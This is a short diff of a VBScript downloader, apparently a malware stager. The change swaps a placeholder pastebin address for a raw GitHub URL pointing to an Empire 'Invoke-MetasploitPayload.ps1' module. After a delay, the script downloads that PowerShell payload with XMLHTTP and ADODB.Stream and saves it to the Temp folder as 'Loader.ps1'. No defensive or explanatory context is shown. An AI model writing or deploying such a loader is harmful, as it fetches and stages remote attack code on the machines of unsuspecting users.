@@ -7,7 +7,7 @@
 WScript.Sleep 5000
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
-xHttp.Open "GET", "https://pastebin.com/raw/!!!!!", False
+xHttp.Open "GET", "https://raw.githubusercontent.com/robpot891/Empire/master/data/module_source/code_execution/Invoke-MetasploitPayload.ps1", False
 xHttp.Send
 scriptShell = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "\Loader.ps1"
 with bStrm
